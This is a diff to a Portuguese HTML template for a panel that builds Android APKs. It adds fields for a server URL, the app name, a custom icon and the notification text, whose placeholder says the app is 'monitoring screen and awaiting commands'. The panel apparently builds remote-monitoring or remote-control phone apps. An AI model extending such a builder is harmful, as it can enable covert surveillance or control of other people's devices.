@@ -36,6 +36,7 @@
         }
 
         input[type="text"],
+        input[type="url"],
         input[type="file"] {
             width: 100%;
             padding: 12px;
@@ -121,6 +122,12 @@
             font-size: 13px;
         }
 
+        .dica {
+            font-size: 13px;
+            color: #64748b;
+            margin-top: 4px;
+        }
+
         .status.info {
             display: block;
             background: #eef4ff;
@@ -157,9 +164,23 @@ gunicorn -c gunicorn.conf.py app:app</code>
         {% endif %}
 
         <form id="form-gerar-apk">
+            <label for="url_servidor">URL do servidor (dominio ou IP)</label>
+            <input id="url_servidor" name="url_servidor" type="url"
+                value="{{ url_padrao_servidor }}"
+                placeholder="https://meudominio.com ou http://123.45.67.89" required>
+            <div class="dica">Use o endereco deste painel. Pode ser dominio ou IP com http/https.</div>
+
             <label for="nome_app">Nome do aplicativo</label>
             <input id="nome_app" name="nome_app" type="text" maxlength="40"
                 placeholder="Ex: {{ branding.nome_padrao_apk }}" required>
+
+            <label for="titulo_notificacao">Titulo da notificacao no celular</label>
+            <input id="titulo_notificacao" name="titulo_notificacao" type="text" maxlength="60"
+                placeholder="Ex: {{ branding.nome_padrao_apk }} Ativo">
+
+            <label for="texto_notificacao">Texto da notificacao no celular</label>
+            <input id="texto_notificacao" name="texto_notificacao" type="text" maxlength="120"
+                placeholder="Monitorando tela e aguardando comandos">
 
             <label for="icone">Icone do aplicativo</label>
             <input id="icone" name="icone" type="file" accept="image/png,image/jpeg,image/webp">
